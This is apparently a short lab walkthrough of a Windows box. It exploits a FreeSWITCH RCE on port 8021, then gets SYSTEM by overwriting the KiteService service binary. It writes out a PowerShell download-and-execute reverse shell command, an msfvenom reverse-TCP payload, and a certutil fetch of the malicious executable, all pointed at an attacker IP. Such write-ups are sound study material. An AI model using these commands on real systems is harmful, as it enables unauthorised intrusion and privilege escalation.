# Take Away
# Exploitation
- `nmap` will identify the target is hosting `freeSWITCH` on port 8021 and `searchsploit` will identify a potential `RCE` which we confirmed by issuing `whoami` command.![[Pasted image 20240217132617.png]]![[Pasted image 20240217132906.png]]
- Set up `netcat` listener and run `python3 47799.py 192.168.226.151 "powershell.exe -nop -w hidden -c iex(iwr http://192.168.45.229/nishang/Shells/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.45.229 443"` to catch a reverse shell.![[Pasted image 20240217134228.png]]
# PrivEsc
- `winpeas` will identify a service `kiteService` with possible `dll hijacking` and `unquoted path`.![[Pasted image 20240217140413.png]]
	- Running `Get-CimInstance win32_service | Select Name,StartName,PathName,State | Where-Object {$_.Name -like 'kiteService'}` will identify the service is running under the `system` account which make it a prime target.![[Pasted image 20240217140554.png]]
- Generate malicious payload with `msfvenom -p windows/powershell_reverse_tcp lhost=192.168.45.229 lport=443 -f exe -o KiteService.exe`.
- Navigate to `C:\Program Files\Kite` and replace `KiteService.exe` with malicious payload by running `certutil -urlcache -f http://192.168.45.229/KiteService.exe KiteService.exe` and restart the service with `Restart-Service -Name KiteService` to catch a reverse shell under system privileges.![[Pasted image 20240217143740.png]]